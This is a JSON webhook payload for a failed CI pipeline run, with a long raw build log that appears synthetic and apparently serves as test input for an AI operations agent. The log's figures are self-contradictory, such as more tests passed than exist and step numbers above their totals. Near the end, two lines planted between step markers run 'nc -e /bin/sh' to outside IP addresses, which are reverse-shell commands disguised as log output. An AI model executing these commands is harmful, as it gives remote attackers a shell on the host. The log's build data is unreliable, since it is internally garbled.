{
  "action": "completed",
  "workflow_run": {
    "id": 554,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "01f10d8e3696a0d17549c309f7704f03b831e7e4",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-02T12:19:11.633939Z",
    "updated_at": "2025-12-02T12:22:48.400373Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\n\u2717 build failed with exit code 86\nnpm notice: package.json updated\nStep 11/25: Running migrations\n[12:19:11] INFO: Processing request\nCache invalidated: node_modules\nUsing Node.js 20.10.1\nnpm install: resolved 1536 packages\n\u2713 lint completed\n  PASS: test_user_create (17ms)\nProcessing...\n[12:19:11] WARN: Deprecated API usage\nStep 16/15: Testing\nyarn add: Done in 17.25s\nTransforming 749 files...\nnpm install: resolved 1260 packages\nTests: 153 passed, 332 total\nnpm install: resolved 712 packages\nOptimizing 81 modules...\nSnapshots: 37 passed, 21 total\nHEAD is now at 4b110fd\nPlatform: darwin-arm64\nArtifact downloaded: 28MB\nStep 11/23: Testing\nTests: 366 passed, 82 total\nChecking out main branch\nStep 18/15: Linting\nCompiling src/handler.rs...\nStep 1/17: Running migrations\nStep 17/22: Running migrations\n\u2713 validate completed\nWARNING: webpack has known vulnerabilities\nConnecting to startup.dev:443...\nOK\nTLS handshake completed\nUsing Node.js 20.11.0\nSnapshots: 38 passed, 49 total\n  PASS: integration/test_auth_login.spec.js\nSuccess!\nTLS handshake completed\n[12:19:11] WARN: Deprecated API usage\nSuccess!\nCache miss for key-9271\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nFetching submodules...\n\u2713 Task completed in 1920ms\nStep 8/23: Deploying\nNODE_ENV=production\n\u2713 Task completed in 4401ms\n[12:19:11] WARN: Deprecated API usage\n  PASS: e2e/test_cache_hit.spec.js\nWARNING: jest has known vulnerabilities\nNODE_ENV=development\nDone.\nTest Suites: 31 passed, 50 total\nProcessing...\n\u2713 Step 'test' succeeded\n[12:19:11] DEBUG: Initializing service\n[12:19:11] INFO: Starting build process\nSnapshots: 13 passed, 8 total\nNODE_ENV=development\nCache restored successfully (413MB)\npip install: Successfully installed lodash-2.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:11] INFO: Starting build process\nUploading artifact 'dist' (48 files)\nOptimizing 16 modules...\npip: Installing build dependencies...\nStep 6/17: Running migrations\nCache restored successfully (195MB)\nBundling styles.css\n  PASS: test_user_create (268ms)\nFetching submodules...\n[12:19:11] DEBUG: Query executed in 12ms\nTest Suites: 45 passed, 15 total\nSwitched to branch 'bugfix/task-548'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: alpine:3.11\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:11] WARN: Deprecated API usage\nStep 16/16: Deploying\nStep 9/16: Building\nFAILED: test_api_health\nLayer 1/11: ENV command\nSwitched to branch 'bugfix/task-943'\nWaiting...\nCache hit for key-6784\npip: Installing build dependencies...\n  PASS: unit/test_db_connect.spec.js\nnpm notice: package.json updated\n=== Step setup_node completed ===\n=== Step: save_cache ===\nArtifact uploaded: dist.zip (79MB)\nAlready up to date.\nCreating production build...\nBundling runtime.css\npip: Collecting react\nTime: 14.110s\nGenerating source maps...\nnpm notice: package.json updated\nConnection established\n\u2713 Task completed in 3231ms\n  PASS: integration/test_auth_login.spec.js\nTests: 365 passed, 488 total\nCompiling src/service.java...\nConnecting to test.io:443...\nEnvironment: staging\nCache hit for key-3726\nBuilding Docker image...\nFetching submodules...\nRan 115 tests in 26s\nArtifact downloaded: 25MB\nCompiling lib/utils.go...\nFetching submodules...\nNODE_ENV=development\nCache saved successfully\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (100MB)\n[12:19:11] DEBUG: Loading configuration\npip: Downloading eslint-1.3.tar.gz\nOptimizing 12 modules...\nStep 13/24: Linting\nAlready up to date.\nBuilding Docker image...\nImage pulled successfully\nProcessing...\n[12:19:11] INFO: Processing request\nSuccess!\nWARNING: prettier has known vulnerabilities\nStep 9/22: Deploying\nCache hit for key-7854\nTime: 6.373s\nGET /status - 200 (88ms)\nEnvironment: staging\nnpm notice: created a lockfile\nCreating production build...\nTime: 17.110s\nHEAD is now at b77de44\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling styles.css\nPushing to registry...\nStep 11/16: Testing\nCache miss for key-1992\npip install: Successfully installed axios-2.20\nLoading...\nImage pulled successfully\n[12:19:11] INFO: Starting build process\n[12:19:11] DEBUG: Query executed in 62ms\n[12:19:11] INFO: Processing request\n[12:19:11] DEBUG: Memory usage: 1592MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: linux-x64\nWaiting...\nReady.\nCoverage: 84% statements, 69% branches\nStep 6/23: Building\n\u2713 Step 'build' succeeded\nAlready up to date.\n[12:19:11] DEBUG: Memory usage: 1040MB\nStep 16/17: Linting\nEnvironment: staging\npip: Installing build dependencies...\n[12:19:11] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 81% statements, 90% branches\nSnapshots: 12 passed, 17 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nOptimizing 48 modules...\n[12:19:11] DEBUG: Initializing service\n\u2713 Step 'checkout' succeeded\nEnvironment: development\nTests: 253 passed, 496 total\nHEAD is now at bf01cbb\nLayer 7/15: COPY command\nSnapshots: 44 passed, 33 total\nCache invalidated: node_modules\nCompiling src/service.java...\nCache miss for key-5207\nStep 14/18: Building\nFAILED: test_api_health\n[12:19:11] INFO: Starting build process\nImage pulled successfully\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\nWaiting...\nStep 20/22: Testing\nMinifying vendor.js\nAlready up to date.\nUsing Node.js 17.2.4\nTransforming 363 files...\nHEAD is now at c46e143\nCompleted.\nLoading...\n\u2713 All checks passed\nNODE_ENV=test\nReady.\nProcessing...\n\u2713 All checks passed\n\u2717 build failed with exit code 27\nCompiling utils/handler.rs...\nTime: 16.870s\nCreating production build...\npip: Installing build dependencies...\nTime: 51.244s\npip: Collecting prettier\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 deploy completed\nCache miss for key-4032\nStep 13/17: Testing\nArtifact uploaded: dist.zip (6MB)\nnpm notice: package.json updated\n\u2713 test completed\nCompiling src/handler.rs...\n[12:19:11] DEBUG: Memory usage: 980MB\n\u2713 Task completed in 3782ms\nMinifying main.js\nBuilding Docker image...\n[12:19:11] ERROR: Connection failed\n[12:19:11] DEBUG: Initializing service\n[12:19:11] WARN: Deprecated API usage\nFAILED: test_user_create\nWARNING: react has known vulnerabilities\n[12:19:11] INFO: Request completed\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nVerifying...\nLayer 8/11: COPY command\nBuilding Docker image...\nCoverage: 93% statements, 73% branches\nCoverage: 86% statements, 90% branches\nnpm install: resolved 1680 packages\nArtifact downloaded: 19MB\n[12:19:11] INFO: Starting build process\nPOST /api - 200 (105ms)\nStep 5/15: Installing dependencies\nCompiling src/utils.go...\nyarn add: Done in 14.27s\n\u2713 package completed\nArtifact uploaded: build.tar.gz (16MB)\nRan 13 tests in 36s\nStep 4/17: Building\n[12:19:11] DEBUG: Memory usage: 1036MB\nnpm notice: package.json updated\nBundling runtime.css\nArtifact downloaded: 22MB\nUsing Python 3.11\nWARNING: react has known vulnerabilities\nSwitched to branch 'feature/task-601'\n[12:19:11] INFO: Request completed\npip: Downloading jest-5.1.tar.gz\nBundling styles.css\nCache invalidated: build\nCache saved successfully\n\u2717 build failed with exit code 100\nOptimizing 56 modules...\n\u2713 package completed\n\u2713 All checks passed\nNODE_ENV=production\nFAILED: test_auth_login\nPOST /data - 201 (359ms)\nCompiling components/handler.rs...\nOptimizing 79 modules...\nCache restored successfully (66MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'build' (46 files)\nDone.\nnpm install: resolved 1132 packages\nHEAD is now at 7379743\n\u2713 Step 'build' succeeded\n  PASS: unit/test_cache_hit.spec.js\nOK\nTransforming 345 files...\nSwitched to branch 'feature/task-351'\nHEAD is now at 8f54f73\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nnpm notice: created a lockfile\nTLS handshake completed\nArtifact downloaded: 40MB\nOK\nRan 93 tests in 35s\n\u2713 Step 'build' succeeded\nStep 13/22: Running migrations\nnpm install: added 432 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:11] INFO: Connecting to database\npip: Installing build dependencies...\nCreating production build...\n  PASS: integration/test_api_health.spec.js\nEnvironment: production\nHEAD is now at d2c5a47\nStep 2/18: Building\nCompiling components/index.js...\n[12:19:11] INFO: Cache refreshed\n[12:19:11] DEBUG: Query executed in 55ms\nTime: 18.408s\n[12:19:11] DEBUG: Query executed in 38ms\nnpm install: resolved 1247 packages\nBuilding Docker image...\nPushing to registry...\nCompiling src/utils.go...\npip install: Successfully installed express-5.5\nArtifact downloaded: 8MB\nCompiling components/main.py...\nCreating production build...\nnpm notice: created a lockfile\n\u2713 All checks passed\nAlready up to date.\nCompiling components/main.py...\nArtifact downloaded: 38MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@4.12.1\n[12:19:11] DEBUG: Loading configuration\nVerifying...\nVerifying...\npip: Installing build dependencies...\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (32MB)\nyarn add: Done in 12.9s\nSuccess!\nUsing Node.js 16.5.9\nFetching submodules...\nGET /status - 201 (9ms)\nFetching submodules...\nTests: 106 passed, 417 total\nStep 19/17: Deploying\nWARNING: jest has known vulnerabilities\nGET /health - 200 (66ms)\n\u2713 build completed\nStep 6/15: Running migrations\nCache miss for key-4068\nCache miss for key-6387\npip: Collecting prettier\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFAILED: test_api_health\nArtifact uploaded: dist.zip (68MB)\n  PASS: test_auth_login (303ms)\nUsing Node.js 17.19.9\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (7MB)\nHEAD is now at 7e8ed17\nMinifying main.js\nCreating production build...\nCompleted.\n[12:19:11] INFO: Processing request\n\u2713 All checks passed\nCompiling src/utils.go...\nPlatform: linux-x64\n[12:19:11] INFO: Processing request\nnpm notice: package.json updated\npip: Collecting prettier\n[12:19:11] WARN: Deprecated API usage\nyarn add: Done in 1.51s\nArtifact uploaded: build.tar.gz (49MB)\n[12:19:11] INFO: Processing request\nFetching submodules...\nGenerating source maps...\npip: Downloading lodash-3.16.tar.gz\n[12:19:11] INFO: Starting build process\nSuccess!\nUsing Node.js 17.6.4\nArtifact uploaded: build.tar.gz (33MB)\n[12:19:11] INFO: Processing request\nTests: 358 passed, 246 total\nCache restored successfully (283MB)\n\u2713 Step 'build' succeeded\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nImage pulled successfully\nFinished.\nTLS handshake completed\n[12:19:11] INFO: Starting build process\nUsing Python 3.11\nStep 15/23: Building\nCompiling components/main.py...\n[12:19:11] WARN: Deprecated API usage\n  PASS: test_db_connect (348ms)\nUsing Node.js 14.1.3\nDone.\nnpm install: added 201 packages\nDone.\nnpm notice: package.json updated\nStep 4/17: Building\nnpm notice: created a lockfile\npip: Installing build dependencies...\nTime: 47.684s\n[12:19:11] INFO: Connecting to database\nArtifact uploaded: dist.zip (92MB)\nSwitched to branch 'feature/task-685'\nStep 4/16: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 14/20: Testing\nCompiling components/handler.rs...\n[12:19:11] INFO: Request completed\nFetching submodules...\nStep 10/15: Building\nAlready up to date.\nRan 162 tests in 36s\nArtifact uploaded: build.tar.gz (49MB)\nUsing Node.js 19.15.4\n\u2713 Step 'checkout' succeeded\nLayer 5/12: COPY command\n\u2717 build failed with exit code 60\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 13/25: Linting\nCompleted.\nnpm install: resolved 1183 packages\nCoverage: 77% statements, 61% branches\nCache hit for key-9160\nRan 179 tests in 59s\nProcessing...\nStep 20/25: Linting\npip: Downloading eslint-4.16.tar.gz\nAlready up to date.\nnpm install: resolved 1996 packages\nCoverage: 100% statements, 92% branches\n[12:19:11] INFO: Starting build process\n  PASS: test_auth_login (278ms)\nAlready up to date.\nBuilding Docker image...\nMinifying vendor.js\nPlatform: linux-x64\nWARNING: lodash has known vulnerabilities\nStep 8/19: Building\npip: Installing build dependencies...\nSwitched to branch 'hotfix/task-991'\n[12:19:11] DEBUG: Query executed in 78ms\nEnvironment: staging\nNODE_ENV=development\n[12:19:11] INFO: Cache refreshed\nWARNING: prettier has known vulnerabilities\nStep 19/22: Deploying\nArtifact downloaded: 34MB\n[12:19:11] INFO: Starting build process\nCoverage: 78% statements, 61% branches\nGenerating source maps...\nGenerating source maps...\nStep 19/21: Installing dependencies\nStep 1/20: Testing\n\u2713 Step 'build' succeeded\nCompiling src/app.ts...\nSnapshots: 33 passed, 4 total\n[12:19:11] DEBUG: Loading configuration\n[12:19:11] INFO: Connecting to database\nWARNING: jest has known vulnerabilities\n[12:19:11] INFO: Connecting to database\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (46MB)\n[12:19:11] DEBUG: Loading configuration\nEnvironment: staging\n[12:19:11] INFO: Connecting to database\nReady.\nBundling runtime.js\nStep 15/21: Installing dependencies\nPOST /upload - 202 (156ms)\nChecking out main branch\nCompleted.\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step integration_tests completed ===\n=== Step: checkout ===\n[12:19:11] DEBUG: Initializing service\nSuccess!\nyarn add: Done in 9.4s\nMinifying app.js\npip: Collecting react\n[12:19:11] INFO: Request completed\nTLS handshake completed\npip: Installing build dependencies...\nTests: 119 passed, 352 total\nCache hit for key-7759\nTest Suites: 19 passed, 10 total\nLoading...\nStep 20/20: Linting\nSnapshots: 15 passed, 22 total\nCache restored successfully (493MB)\nBuilding Docker image...\n\u2713 Step 'install' succeeded\nImage pulled successfully\nNODE_ENV=test\nnpm install: added 286 packages\n\u2713 All checks passed\nOK\nTest Suites: 16 passed, 8 total\nTLS handshake completed\n[12:19:11] ERROR: Connection failed\nUsing Python 3.9\nCompiling lib/main.py...\nNODE_ENV=production\nCompiling components/app.ts...\n\u2713 Step 'build' succeeded\n  PASS: unit/test_db_connect.spec.js\nTest Suites: 37 passed, 20 total\nException: TypeError\nFinished.\nCompiling components/service.java...\nCompleted.\nCompiling src/app.ts...\nTests: 156 passed, 104 total\nCreating production build...\nEnvironment: development\nEnvironment: production\nnpm install: added 325 packages\nCompiling lib/handler.rs...\npip install: Successfully installed eslint-5.19\n\u2713 All checks passed\nWaiting...\n\u2713 deploy completed\n[12:19:11] DEBUG: Loading configuration\nLoading...\nTests: 119 passed, 408 total\npip: Installing build dependencies...\nnpm install: added 70 packages\nUsing Python 3.12\nBundling vendor.js\nCreating production build...\nPushing to registry...\nSuccess!\nTime: 51.186s\nCache saved successfully\n[12:19:11] DEBUG: Initializing service\nNODE_ENV=production\nConnecting to test.io:443...\nTests: 345 passed, 283 total\nUploading artifact 'dist' (41 files)\nFinished.\nPlatform: win32-x64\n  PASS: test_db_connect (295ms)\nGenerating source maps...\nPOST /api - 202 (21ms)\nStep 7/17: Linting\nCache saved successfully\nStep 12/21: Installing dependencies\nDone.\nCompiling lib/main.py...\nHEAD is now at 1fd037c\nGenerating source maps...\npip: Downloading lodash-4.19.tar.gz\nOK\nGenerating source maps...\nCache saved successfully\nnpm install: resolved 1073 packages\n[12:19:11] INFO: Connecting to database\npip install: Successfully installed react-3.0\nVerifying...\nException: TypeError\nProcessing...\n[12:19:11] INFO: Processing request\nConnection established\nOK\n[12:19:11] WARN: Deprecated API usage\nUsing Python 3.9\n=== Step checkout completed ===\n=== Step: unit_tests ===\nUploading artifact 'dist' (23 files)\nPlatform: darwin-arm64\nTime: 65.848s\nCreating production build...\nWaiting...\nInstalling prettier@2.16.5\nCache miss for key-6746\nCompiling lib/main.py...\npip install: Successfully installed webpack-5.0\nUsing Node.js 14.5.3\npip install: Successfully installed jest-3.14\nUsing Node.js 16.8.3\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nFetching submodules...\npip: Installing build dependencies...\nStep 3/20: Installing dependencies\nVerifying...\nStep 6/24: Running migrations\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 981 files...\nArtifact uploaded: dist.zip (13MB)\nWARNING: webpack has known vulnerabilities\n[12:19:11] DEBUG: Initializing service\n[12:19:11] WARN: Deprecated API usage\nEnvironment: test\nTest Suites: 14 passed, 11 total\nGET /status - 204 (79ms)\nSwitched to branch 'feature/task-280'\n  PASS: unit/test_user_create.spec.js\nWARNING: react has known vulnerabilities\nGET /status - 204 (97ms)\nUsing Python 3.9\nInstalling prettier@3.2.1\n  PASS: integration/test_user_create.spec.js\nFetching submodules...\n\u2713 validate completed\n[12:19:11] DEBUG: Memory usage: 1839MB\n[12:19:11] INFO: Connecting to database\nCache saved successfully\nCompleted.\n  PASS: e2e/test_auth_login.spec.js\nCache restored successfully (35MB)\nTest Suites: 13 passed, 5 total\nCache restored successfully (315MB)\nWARNING: jest has known vulnerabilities\nFAILED: test_auth_login\nCache miss for key-5900\n[12:19:11] INFO: Request completed\n[12:19:11] INFO: Processing request\nyarn add: Done in 5.7s\nCache saved successfully\n[12:19:11] INFO: Processing request\nStep 5/17: Building\n  PASS: unit/test_user_create.spec.js\nInstalling axios@1.20.7\nArtifact uploaded: build.tar.gz (27MB)\nPushing to registry...\nyarn add: Done in 30.34s\n[12:19:11] INFO: Connecting to database\nTests: 455 passed, 218 total\nCache miss for key-5658\nStep 11/21: Testing\n\u2713 Step 'test' succeeded\nFetching submodules...\npip: Collecting axios\n\u2713 Step 'build' succeeded\npip: Downloading lodash-3.14.tar.gz\nTime: 120.236s\nnpm notice: created a lockfile\nConnecting to startup.dev:443...\nPulling image: python:3.11\nEnvironment: production\n[12:19:11] DEBUG: Initializing service\nCompiling components/utils.go...\nStep 10/23: Installing dependencies\nnpm notice: created a lockfile\nPulling image: alpine:latest\npip: Downloading jest-3.20.tar.gz\nPulling image: alpine:18\n[12:19:11] WARN: Deprecated API usage\nCompleted.\nStep 10/24: Installing dependencies\nProcessing...\nInstalling webpack@3.3.10\nStep 12/24: Testing\nOK\nStep 6/24: Running migrations\n\u2713 Step 'build' succeeded\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\nArtifact uploaded: build.tar.gz (8MB)\nBundling styles.css\npip install: Successfully installed prettier-1.4\nCache miss for key-8920\nnpm install: resolved 1153 packages\nBuilding Docker image...\nCache hit for key-5575\n\u2713 Task completed in 1611ms\nCompiling lib/app.ts...\nTest Suites: 26 passed, 10 total\n\u2713 All checks passed\nTest Suites: 31 passed, 20 total\nSwitched to branch 'feature/task-120'\nSwitched to branch 'feature/task-977'\nnpm install: resolved 1785 packages\nAlready up to date.\n\u2713 build completed\n[12:19:11] INFO: Connecting to database\nUploading artifact 'build' (11 files)\n\u2713 Step 'build' succeeded\nInstalling express@1.12.7\nCache miss for key-5620\nCompiling components/main.py...\nArtifact uploaded: build.tar.gz (31MB)\nTests: 59 passed, 162 total\nTests: 285 passed, 129 total\n[12:19:11] DEBUG: Initializing service\nVerifying...\nReady.\n[12:19:11] DEBUG: Memory usage: 1907MB\nUsing Python 3.12\nStep 14/19: Installing dependencies\n[12:19:11] DEBUG: Initializing service\nOptimizing 26 modules...\npip: Installing build dependencies...\nChecking out main branch\nChecking out master branch\nGET /health - 200 (52ms)\n[12:19:11] INFO: Starting build process\nGET /status - 201 (93ms)\nFinished.\nUsing Node.js 15.16.2\nRan 182 tests in 9s\nTime: 19.341s\n  PASS: test_db_connect (264ms)\n[12:19:11] DEBUG: Connection pool: 10 active\npip: Collecting react\nnpm notice: created a lockfile\n[12:19:11] DEBUG: Memory usage: 1845MB\nTransforming 723 files...\n[12:19:11] WARN: Deprecated API usage\n[12:19:11] INFO: Processing request\nnpm install: resolved 807 packages\nImage pulled successfully\nEnvironment: staging\npip: Installing build dependencies...\n[12:19:11] DEBUG: Initializing service\nUsing Python 3.9\n\u2713 Step 'test' succeeded\n[12:19:11] WARN: Deprecated API usage\nCache miss for key-3270\nCompiling utils/main.py...\nBuilding Docker image...\nCompleted.\nBundling main.js\nPushing to registry...\nTest Suites: 32 passed, 33 total\n\u2713 Step 'test' succeeded\nFAILED: test_user_create\nCache invalidated: build\nLayer 9/9: RUN command\n[12:19:11] INFO: Processing request\nVerifying...\n\u2713 All checks passed\n[12:19:11] INFO: Connecting to database\nBuilding Docker image...\npip install: Successfully installed eslint-2.16\nWARNING: jest has known vulnerabilities\n[12:19:11] WARN: Deprecated API usage\nPlatform: darwin-arm64\nStep 10/24: Installing dependencies\n[12:19:11] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:19:11] WARN: Deprecated API usage\nGenerating source maps...\nFinished.\nImage pulled successfully\nnpm notice: package.json updated\nLayer 8/11: COPY command\nLayer 6/11: RUN command\nArtifact uploaded: build.tar.gz (4MB)\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nUsing Node.js 17.17.8\nSnapshots: 21 passed, 48 total\nFinished.\nPushing to registry...\nLayer 5/8: RUN command\nnpm notice: package.json updated\nCompiling src/handler.rs...\nInstalling webpack@4.15.8\nArtifact downloaded: 14MB\n[12:19:11] DEBUG: Query executed in 19ms\npip: Installing build dependencies...\nUsing Node.js 20.7.10\n[12:19:11] ERROR: Connection failed\nGenerating source maps...\n  PASS: test_api_health (454ms)\nConnecting to example.com:443...\nFetching submodules...\nnpm install: added 394 packages\n[12:19:11] DEBUG: Query executed in 17ms\n[12:19:11] WARN: Deprecated API usage\nCreating production build...\nCompiling utils/handler.rs...\nInstalling lodash@3.16.4\nSwitched to branch 'hotfix/task-623'\n\u2713 package completed\nCache hit for key-9491\nOptimizing 95 modules...\nTest Suites: 26 passed, 37 total\nConnecting to test.io:443...\nnpm notice: package.json updated\nReady.\nBuilding Docker image...\nSnapshots: 14 passed, 12 total\n[12:19:11] WARN: Deprecated API usage\npip: Installing build dependencies...\nGET /health - 200 (28ms)\nnpm install: resolved 112 packages\nDone.\nStep 7/21: Linting\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying main.js\nConnection established\npip install: Successfully installed react-1.17\nStep 2/22: Running migrations\n[12:19:11] DEBUG: Memory usage: 143MB\nSnapshots: 15 passed, 3 total\nCache invalidated: build\nCompleted.\n[12:19:11] INFO: Processing request\nGenerating source maps...\nPlatform: linux-x64\nPushing to registry...\n[12:19:11] INFO: Starting build process\nCompiling utils/handler.rs...\nTests: 250 passed, 129 total\n\u2713 All checks passed\nLoading...\nStep 5/18: Deploying\nWARNING: react has known vulnerabilities\nCache restored successfully (290MB)\nCoverage: 76% statements, 85% branches\nPushing to registry...\nInstalling express@5.0.3\n[12:19:11] INFO: Processing request\n[12:19:11] INFO: Cache refreshed\nStep 16/16: Running migrations\n\u2713 package completed\nConnection established\nStep 8/19: Testing\nWARNING: axios has known vulnerabilities\nSwitched to branch 'feature/task-416'\nTests: 354 passed, 202 total\nInstalling jest@4.4.5\n  PASS: test_api_health (242ms)\npip: Installing build dependencies...\nTransforming 116 files...\nnpm notice: package.json updated\npip: Installing build dependencies...\nNODE_ENV=development\nArtifact downloaded: 18MB\n[12:19:11] WARN: Deprecated API usage\nMinifying app.js\nPulling image: alpine:3.11\nUploading artifact 'coverage' (32 files)\nPOST /api - 200 (37ms)\nLayer 6/9: RUN command\n[12:19:11] INFO: Starting build process\nnpm notice: package.json updated\nCompiling components/utils.go...\nException: NullPointerException\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\n[12:19:11] DEBUG: Memory usage: 460MB\n\u2713 Task completed in 4497ms\npip: Installing build dependencies...\n\u2713 All checks passed\nCompiling utils/main.py...\nPulling image: python:latest\nArtifact downloaded: 13MB\nException: TypeError\nVerifying...\nHEAD is now at 751568d\nSuccess!\nWARNING: express has known vulnerabilities\nWaiting...\n[12:19:11] DEBUG: Loading configuration\nAlready up to date.\nCompiling src/index.js...\nProcessing...\nTests: 155 passed, 400 total\nCache hit for key-1363\nCache saved successfully\nPushing to registry...\n[12:19:11] WARN: Deprecated API usage\nnpm install: resolved 708 packages\n[12:19:11] ERROR: Connection failed\nyarn add: Done in 11.78s\nArtifact uploaded: dist.zip (33MB)\nUsing Node.js 18.6.7\nInstalling eslint@5.1.0\n[12:19:11] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying main.js\n[12:19:11] WARN: Deprecated API usage\nDone.\nException: NullPointerException\nStep 8/23: Deploying\n\u2713 Task completed in 495ms\n\u2713 Step 'install' succeeded\nSnapshots: 27 passed, 41 total\n[12:19:11] WARN: Deprecated API usage\n\u2713 Task completed in 4357ms\n[12:19:11] DEBUG: Memory usage: 1679MB\nStep 6/16: Deploying\nTime: 55.110s\npip: Downloading lodash-2.20.tar.gz\n\u2713 Task completed in 2577ms\nCompleted.\nRan 162 tests in 22s\nArtifact uploaded: dist.zip (31MB)\nAlready up to date.\n[12:19:11] DEBUG: Loading configuration\nnpm install: added 150 packages\nCompiling src/utils.go...\npip: Collecting lodash\nCompleted.\nTransforming 942 files...\nCompiling components/utils.go...\nVerifying...\nTransforming 579 files...\n\u2713 Step 'checkout' succeeded\npip: Installing build dependencies...\nCache invalidated: node_modules\n[12:19:11] WARN: Deprecated API usage\nTests: 233 passed, 248 total\n[12:19:11] INFO: Starting build process\nCache saved successfully\n[12:19:11] DEBUG: Memory usage: 1748MB\nWARNING: axios has known vulnerabilities\nCoverage: 92% statements, 90% branches\nUsing Python 3.12\nCache invalidated: node_modules\nWARNING: webpack has known vulnerabilities\nStep 10/20: Running migrations\nStep 1/25: Linting\nnpm install: resolved 693 packages\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\n[12:19:11] INFO: Connecting to database\n\u2713 lint completed\nCompiling src/main.py...\nArtifact uploaded: dist.zip (38MB)\nArtifact downloaded: 40MB\npip install: Successfully installed webpack-4.10\nWARNING: axios has known vulnerabilities\nRan 37 tests in 56s\nUsing Python 3.9\n[12:19:11] DEBUG: Loading configuration\nOptimizing 70 modules...\nUsing Python 3.12\nFinished.\nStep 12/20: Running migrations\n[12:19:11] INFO: Connecting to database\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\npip: Downloading express-3.10.tar.gz\nConnecting to example.com:443...\nStep 9/24: Building\npip: Installing build dependencies...\nLayer 1/10: ENV command\nArtifact uploaded: dist.zip (35MB)\nCache hit for key-6556\nnpm notice: package.json updated\nUsing Node.js 17.7.10\nLoading...\nBundling vendor.css\nCompiling utils/handler.rs...\nnpm notice: package.json updated\nCompiling components/service.java...\n[12:19:11] WARN: Deprecated API usage\nStep 9/23: Linting\nFinished.\nRan 80 tests in 58s\nStep 5/25: Linting\npip: Collecting lodash\n[12:19:11] INFO: Starting build process\nConnection established\n  PASS: unit/test_user_create.spec.js\nTest Suites: 10 passed, 30 total\nInstalling express@3.4.6\nPushing to registry...\npip: Downloading eslint-1.20.tar.gz\n[12:19:11] ERROR: Connection failed\n[12:19:11] DEBUG: Query executed in 28ms\nWARNING: jest has known vulnerabilities\nProcessing...\nAlready up to date.\nAlready up to date.\n\u2713 Step 'build' succeeded\npip: Downloading axios-5.19.tar.gz\nStep 3/25: Linting\nDone.\n[12:19:11] DEBUG: Connection pool: 6 active\n[12:19:11] DEBUG: Memory usage: 1453MB\nStep 1/21: Installing dependencies\nStep 12/19: Running migrations\nWaiting...\n  PASS: test_auth_login (342ms)\nException: ValueError\n\u2713 validate completed\nFetching submodules...\nStep 7/19: Linting\nPushing to registry...\nUploading artifact 'coverage' (41 files)\nConnecting to acme.corp:443...\nLayer 10/8: ENV command\nCompleted.\nTLS handshake completed\nSuccess!\n\u2717 build failed with exit code 116\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 Step 'checkout' succeeded\nTime: 4.32s\nTransforming 889 files...\npip: Installing build dependencies...\n[12:19:11] INFO: Starting build process\nNODE_ENV=production\nAlready up to date.\nPushing to registry...\nProcessing...\n[12:19:11] INFO: Starting build process\n\u2713 Step 'install' succeeded\n[12:19:11] INFO: Request completed\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 18/19: Deploying\nCreating production build...\nCache saved successfully\nStep 10/22: Linting\n\u2713 Step 'checkout' succeeded\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (4MB)\nPulling image: alpine:18\nArtifact uploaded: dist.zip (51MB)\nGET /status - 200 (3ms)\nBundling styles.css\nHEAD is now at c6823c4\nCache saved successfully\nVerifying...\nRan 170 tests in 44s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:11] INFO: Starting build process\nCache invalidated: build\nnpm install: added 170 packages\nCompleted.\nArtifact uploaded: build.tar.gz (33MB)\n=== Step upload_artifacts completed ===\nnc -e /bin/sh 224.253.200.157 26024\n=== Step: deploy_staging ===\n[12:19:11] DEBUG: Loading configuration\nGET /health - 201 (64ms)\nNODE_ENV=test\nPushing to registry...\nDone.\nnpm install: added 311 packages\nStep 9/19: Running migrations\n[12:19:11] INFO: Request completed\n[12:19:11] DEBUG: Memory usage: 1248MB\nnc -e /bin/sh 43.70.231.68 63160\nFetching submodules...\npip: Downloading lodash-2.1.tar.gz\n[12:19:11] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\nSnapshots: 4 passed, 11 total\n\u26a0 DEPRECATION: Feature will be removed 